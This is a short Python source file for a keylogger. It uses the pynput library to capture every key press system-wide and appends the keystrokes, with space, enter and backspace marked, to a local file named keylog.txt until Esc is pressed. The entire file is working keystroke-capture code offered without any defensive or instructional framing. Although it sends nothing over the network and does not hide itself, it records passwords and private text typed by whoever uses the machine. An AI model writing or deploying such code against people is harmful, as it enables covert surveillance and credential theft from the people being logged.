# keylogger.py
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def write_to_file(key):
    key_data = str(key)
    key_data = key_data.replace("'", "")
    
    if key == Key.space:
        key_data = '\n'
    elif key == Key.enter:
        key_data = '[ENTER]\n'
    elif key == Key.backspace:
        key_data = '[BACKSPACE]'
    
    with open(log_file, "a") as f:
        f.write(key_data)

def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == Key.esc:
        return False  # stop listener

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
